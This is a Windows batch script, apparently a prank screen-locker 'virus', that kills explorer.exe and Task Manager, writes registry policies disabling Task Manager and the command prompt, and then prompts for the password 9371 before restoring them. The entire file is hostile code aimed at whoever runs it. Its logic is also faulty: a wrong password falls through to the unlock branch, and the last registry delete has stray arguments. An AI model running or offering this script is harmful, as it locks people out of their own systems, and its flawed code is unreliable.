@echo off
cls

color 4

:run
taskkill /f /im explorer.exe
Test-Virus.txt
goto Disable-taskmgr

:Disable-taskmgr
mode con cols=120 lines=30
"%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" >nul 2>&1 
taskkill /f /im taskmgr.exe >nul 2>&1
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v disabletaskmgr /t reg_dword /d 1 /f >nul
goto Disable-CMD

:Disable-CMD
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System /v disablecmd /t reg_dword /d 1 /f
timeout /t 10 /nobreak >nul
goto Check

:Check
set /p password=9371:
if %password% == 9371 goto case2

:case1
cls
echo WRONG PASSWORD.....!!!

:case2
cls
echo Correct password
color 17
shutdown -a
start C:\Windows\explorer.exe
mode con cols=120 lines=30
"%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" >nul 2>&1 
reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v disabletaskmgr /f >nul
timeout /t 10 /nobreak >nul
reg delete HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System /v disablecmd /t reg_dword /d 1 /f
pause
exit


